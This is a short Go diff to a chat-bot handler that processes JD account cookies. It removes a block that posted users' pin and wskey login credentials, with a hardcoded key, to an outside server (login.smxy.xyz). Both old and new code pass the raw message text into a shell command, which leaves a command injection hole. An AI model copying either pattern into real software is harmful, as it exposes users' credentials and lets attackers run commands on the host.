@@ -87,24 +87,11 @@ var handleMessage = func(msgs ...interface{}) interface{} {
 		{
 
 			if strings.Contains(msg, "wskey=") {
-				msg1 := cmd(fmt.Sprintf(`python3 test.py "%s"`, msg), &Sender{})
-				logs.Info(fmt.Sprintf(`python3 test.py "%s"`, msg))
-				logs.Info(msg1 + "测试")
+				rsp := cmd(fmt.Sprintf(`python3 test.py "%s"`, msg), &Sender{})
+				logs.Info(rsp)
 				ss1 := regexp.MustCompile(`pin=([^;=\s]+);wskey=([^;=\s]+)`).FindAllStringSubmatch(msg, -1)
 				if len(ss1) > 0 {
 					for _, s := range ss1 {
-						//转换ptkey
-
-						post := "{\"key\":\"" + "xb3z4z2m3n847" +
-							"\",\"wskey\":\"" + "pin=" + s[1] + ";wskey=" + s[2] + ";" +
-							"\"}"
-						req := httplib.Post("http://login.smxy.xyz/getck")
-						req.Body(post)
-						rsp, err := req.String()
-						if err != nil {
-							return err
-						}
-
 						ck := JdCookie{
 							PtPin: s[1],
 							PtKey: rsp,
